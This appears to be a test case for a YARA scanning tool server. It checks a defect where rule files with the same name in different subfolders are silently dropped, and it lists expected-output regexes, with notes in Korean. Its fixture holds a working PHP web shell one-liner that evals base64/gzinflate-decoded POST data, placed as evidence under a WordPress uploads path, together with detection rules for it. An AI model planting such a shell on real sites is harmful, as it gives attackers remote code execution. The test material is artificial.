@@ -1,0 +1,89 @@
+# Matrix case P1018-007: _compile_rules collects a rules folder into a dict
+# keyed by os.path.basename, so of two rule files with the same name in
+# different subfolders only the one globbed last is compiled. The response
+# carries no list of the files compiled and no content hash, so rules_path
+# alone does not tell which rules were applied.
+# Evidence: a PHP web shell of the common one-liner kind (eval of a
+# gzinflate/base64 POST parameter) dropped under a site's upload folder.
+# Rules: a rules folder laid out like downloaded collections, one subfolder
+# per source, each with its own rules.yar: webshells/rules.yar matches the
+# eval-on-$_POST pattern, obfuscation/rules.yar the gzinflate(base64_decode(
+# chain. The shell matches both. Which file survives depends on glob order, so
+# the checks do not name it: scanning the folder gives one match, scanning
+# each file gives one match each. The one match names its source only as the
+# namespace "rules.yar" (the dict key), which both files share.
+case_id: P1018-007
+problem: P1018
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: multi-call
+level: mcp
+realism: possible
+realism_ko: "공개 룰 모음을 출처별 하위 폴더로 받아 두면 드물지 않게 `rules.yar`, `index.yar` 같은 같은 이름의 파일이 여러 폴더에 생기고, 모델은 그 상위 폴더 하나를 `rules_path`로 준다."
+coverage: full
+summary: yara_scan_file with rules_path=<rules folder> returns match_count 1 for a PHP web shell that each of the folder's two rules.yar files (webshells/, obfuscation/) matches on its own, because only one of the two same-named files is compiled; the match names its source only as namespace "rules.yar", which both files share, and the files compiled are not listed.
+summary_ko: "룰 폴더의 두 `rules.yar`(`webshells/`, `obfuscation/`)가 각각 따로는 잡는 PHP 웹셸에 폴더를 `rules_path`로 주어 `yara_scan_file`을 부르면 `match_count` 1이 나온다. 같은 이름의 두 파일 가운데 하나만 컴파일되기 때문이고, 응답은 맞은 룰의 출처를 두 파일이 같이 쓰는 이름 `rules.yar`로만 적고 컴파일한 파일 목록은 싣지 않는다."
+defect_ko: "이 서버는 룰 폴더의 파일을 파일 이름을 키로 모아, 다른 하위 폴더의 같은 이름 파일은 하나만 남기고 나머지를 말없이 뺀다. 폴더 안의 룰 파일을 모두 컴파일하고, 실제로 쓴 파일 목록을 응답에 적어야 한다. 모델은 폴더의 모든 룰을 적용한 결과로 알고, 빠진 룰이 잡았을 탐지가 없다고 잘못 안다."
+setup_ko: "출처별 하위 폴더 `webshells/`, `obfuscation/`에 각각 `rules.yar`를 둔 룰 폴더와, 두 룰이 모두 잡는 PHP 웹셸 한 개를 두고, 폴더 전체와 각 파일로 `yara_scan_file`을 부른다."
+fixture:
+- path: www/html/wp-content/uploads/2026/11/wp-cache.php
+  text: "<?php @eval(gzinflate(base64_decode($_POST['k'])));?>\n"
+- path: rules/webshells/rules.yar
+  root: outside
+  text: |
+    rule WEBSHELL_PHP_Eval_POST
+    {
+        meta:
+            description = "PHP one-liner that evaluates code taken from a POST parameter"
+            author = "local"
+        strings:
+            $php = "<?php"
+            $eval = "eval("
+            $post = "$_POST["
+        condition:
+            filesize < 10KB and all of them
+    }
+- path: rules/obfuscation/rules.yar
+  root: outside
+  text: |
+    rule OBFUSC_PHP_Gzinflate_Base64
+    {
+        meta:
+            description = "PHP gzinflate(base64_decode()) decoding chain"
+            author = "local"
+        strings:
+            $php = "<?php"
+            $chain = "gzinflate(base64_decode("
+        condition:
+            all of them
+    }
+steps:
+- tool: yara_scan_file
+  note_ko: "결함 호출: 룰 폴더 전체로 웹셸을 검사한다"
+  args:
+    file_path: ${EVIDENCE}/www/html/wp-content/uploads/2026/11/wp-cache.php
+    rules_path: ${OUTSIDE}/rules
+- tool: yara_scan_file
+  note_ko: "비교 호출: `webshells/rules.yar`만으로 검사한다"
+  args:
+    file_path: ${EVIDENCE}/www/html/wp-content/uploads/2026/11/wp-cache.php
+    rules_path: ${OUTSIDE}/rules/webshells/rules.yar
+- tool: yara_scan_file
+  note_ko: "비교 호출: `obfuscation/rules.yar`만으로 검사한다"
+  args:
+    file_path: ${EVIDENCE}/www/html/wp-content/uploads/2026/11/wp-cache.php
+    rules_path: ${OUTSIDE}/rules/obfuscation/rules.yar
+expect:
+- step: 2
+  note_ko: "`webshells/rules.yar`만으로는 웹셸 룰이 맞는다"
+  regex: '"success": true, "file": "[^"]*", "match_count": 1, "matches": \[\{"rule": "WEBSHELL_PHP_Eval_POST"'
+- step: 3
+  note_ko: "`obfuscation/rules.yar`만으로는 난독화 룰이 맞는다"
+  regex: '"success": true, "file": "[^"]*", "match_count": 1, "matches": \[\{"rule": "OBFUSC_PHP_Gzinflate_Base64"'
+- step: 1
+  note_ko: 두 파일이 든 폴더로 검사하면 하나만 맞는다
+  regex: '"success": true, "file": "[^"]*", "match_count": 1, "matches": \[\{"rule": "(WEBSHELL_PHP_Eval_POST|OBFUSC_PHP_Gzinflate_Base64)"'
+- step: 1
+  note_ko: 응답은 맞은 룰의 출처를 파일 이름 `rules.yar`로만 적어, 두 하위 폴더 가운데 어느 파일이 쓰였는지 알 수 없다
+  regex: '"match_count": 1, "matches": \[\{"rule": "[A-Za-z0-9_]+", "namespace": "rules.yar"'
